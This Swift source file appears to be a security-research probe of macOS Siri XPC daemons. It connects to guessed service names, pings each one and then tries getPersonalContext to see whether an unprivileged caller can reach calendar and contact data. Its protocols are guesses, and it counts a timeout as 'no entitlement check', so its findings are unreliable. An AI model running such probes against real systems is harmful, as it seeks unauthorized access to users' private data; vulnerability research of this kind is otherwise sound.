// siriinferenced + siri.context.service XPC Probe
// Targets (all confirmed RUNNING on macOS 15.7.7):
//   com.apple.siriinferenced  (PID 864)
//   com.apple.siri.context.service  (PID 522)
//   com.apple.siriknowledged  (PID 751)
//   com.apple.siriactionsd  (PID 333)
//
// siriinferenced handles on-device ML inference for Siri requests.
// siri.context.service manages Siri's personal context (contacts, calendar, etc.)
// Both process user data and should be entitlement-gated.

import Foundation

@objc protocol SiriInferenceXPC: NSObjectProtocol {
    @objc optional func runInference(_ input: NSDictionary?,
                                      reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func submitQuery(_ query: NSString?,
                                     context: NSDictionary?,
                                     reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func cancelInference(_ requestID: NSString?,
                                         reply: ((Bool, NSError?) -> Void)?)
    @objc optional func getModelInfo(_ reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func getAvailableModels(_ reply: ((NSArray?, NSError?) -> Void)?)
    @objc optional func loadModel(_ modelID: NSString?,
                                   reply: ((Bool, NSError?) -> Void)?)
    @objc optional func ping(_ reply: ((Bool, NSError?) -> Void)?)
    @objc optional func getStatus(_ reply: ((NSDictionary?, NSError?) -> Void)?)
}

@objc protocol SiriContextXPC: NSObjectProtocol {
    @objc optional func getPersonalContext(_ query: NSString?,
                                            reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func getContacts(_ filter: NSDictionary?,
                                     reply: ((NSArray?, NSError?) -> Void)?)
    @objc optional func getCalendarEvents(_ range: NSDictionary?,
                                           reply: ((NSArray?, NSError?) -> Void)?)
    @objc optional func getRecentActivity(_ reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func queryUserData(_ query: NSString?,
                                       reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func ping(_ reply: ((Bool, NSError?) -> Void)?)
    @objc optional func getStatus(_ reply: ((NSDictionary?, NSError?) -> Void)?)
}

@objc protocol SiriKnowledgeXPC: NSObjectProtocol {
    @objc optional func query(_ question: NSString?,
                               reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func lookup(_ entity: NSString?,
                                reply: ((NSDictionary?, NSError?) -> Void)?)
    @objc optional func ping(_ reply: ((Bool, NSError?) -> Void)?)
    @objc optional func getStatus(_ reply: ((NSDictionary?, NSError?) -> Void)?)
}

// Confirmed running from launchctl + additional sub-service variants
let SIRI_TARGETS: [(name: String, label: String)] = [
    // siriinferenced variants
    ("com.apple.siriinferenced", "siriinferenced"),
    ("com.apple.siriinference", "siriinferenced"),
    ("com.apple.siriinferenced.xpc", "siriinferenced"),
    ("com.apple.SiriInference", "siriinferenced"),
    ("com.apple.SiriInference.daemon", "siriinferenced"),
    // siri.context.service variants
    ("com.apple.siri.context.service", "siri.context.service"),
    ("com.apple.siri.context", "siri.context.service"),
    ("com.apple.SiriContext", "siri.context.service"),
    // siriknowledged variants
    ("com.apple.siriknowledged", "siriknowledged"),
    ("com.apple.siriknowledge", "siriknowledged"),
    ("com.apple.SiriKnowledge", "siriknowledged"),
    // siriactionsd variants
    ("com.apple.siriactionsd", "siriactionsd"),
    ("com.apple.siri.actions", "siriactionsd"),
]

func probe(service name: String, protocol proto: Protocol, waitSecs: Int = 4,
           action: @escaping (AnyObject, DispatchSemaphore) -> Void) {
    print("\n--- Probing: \(name) ---")
    let conn = NSXPCConnection(machServiceName: name, options: [])
    conn.remoteObjectInterface = NSXPCInterface(with: proto)

    var result = "(pending)"
    let sema = DispatchSemaphore(value: 0)

    conn.invalidationHandler = { if result == "(pending)" { result = "INVALIDATED" }; sema.signal() }
    conn.interruptionHandler = { if result == "(pending)" { result = "INTERRUPTED" }; sema.signal() }
    conn.resume()

    let proxy = conn.remoteObjectProxyWithErrorHandler { err in
        result = "ERROR: \(err.localizedDescription)"
        sema.signal()
    }

    action(proxy as AnyObject, sema)

    if sema.wait(timeout: .now() + .seconds(waitSecs)) == .timedOut {
        result = "TIMEOUT (\(waitSecs)s) *** ACCEPTED — NO ENTITLEMENT CHECK ***"
    }
    print("  RESULT: \(result)")
    conn.invalidate()
    Thread.sleep(forTimeInterval: 1.0)
}

print("=== Siri Inference / Context / Knowledge XPC Probe ===")
print("PID: \(ProcessInfo.processInfo.processIdentifier)  UID: \(getuid())")
print("All targets confirmed running on this system via launchctl.\n")

for target in SIRI_TARGETS {
    let (name, label) = target
    if label == "siriinferenced" {
        probe(service: name, protocol: SiriInferenceXPC.self, waitSecs: 4) { proxy, sema in
            guard let p = proxy as? SiriInferenceXPC else { sema.signal(); return }
            p.ping? { _, _ in print("  ** PING REPLY **"); sema.signal() }
            DispatchQueue.global().asyncAfter(deadline: .now() + 3.5) { sema.signal() }
        }
    } else if label == "siri.context.service" {
        probe(service: name, protocol: SiriContextXPC.self, waitSecs: 4) { proxy, sema in
            guard let p = proxy as? SiriContextXPC else { sema.signal(); return }
            p.ping? { _, _ in print("  ** PING REPLY **"); sema.signal() }
            DispatchQueue.global().asyncAfter(deadline: .now() + 3.5) { sema.signal() }
        }
    } else {
        probe(service: name, protocol: SiriKnowledgeXPC.self, waitSecs: 4) { proxy, sema in
            guard let p = proxy as? SiriKnowledgeXPC else { sema.signal(); return }
            p.ping? { _, _ in print("  ** PING REPLY **"); sema.signal() }
            DispatchQueue.global().asyncAfter(deadline: .now() + 3.5) { sema.signal() }
        }
    }
}

print("\n=== PHASE 2: Deep probe any services that accepted ===")
print("(Only runs if any service above returned TIMEOUT/REPLY)")

// If siri.context.service accepts, this is the highest-value finding:
// it has access to contacts, calendar, messages — protected data
let ctxConn = NSXPCConnection(machServiceName: "com.apple.siri.context.service", options: [])
ctxConn.remoteObjectInterface = NSXPCInterface(with: SiriContextXPC.self)
var ctxResult = "(pending)"
let ctxSema = DispatchSemaphore(value: 0)
ctxConn.invalidationHandler = { ctxResult = "INVALIDATED"; ctxSema.signal() }
ctxConn.interruptionHandler = { ctxResult = "INTERRUPTED"; ctxSema.signal() }
ctxConn.resume()

let ctxProxy = ctxConn.remoteObjectProxyWithErrorHandler { err in
    ctxResult = "ERROR: \(err.localizedDescription)"
    ctxSema.signal()
} as? SiriContextXPC

ctxProxy?.getPersonalContext?("What are my upcoming calendar events?") { resp, err in
    if let r = resp {
        ctxResult = "*** DATA LEAK: getPersonalContext returned \(r.count) keys ***"
    } else {
        ctxResult = "REPLY: nil response (but method accepted)"
    }
    ctxSema.signal()
}

if ctxSema.wait(timeout: .now() + 8) == .timedOut {
    ctxResult = "TIMEOUT (8s) *** getPersonalContext accepted from unprivileged caller — HIGH SEVERITY ***"
}
print("\nDEEP PROBE siri.context.service / getPersonalContext: \(ctxResult)")
ctxConn.invalidate()

print("\n=== PROBE COMPLETE ===")
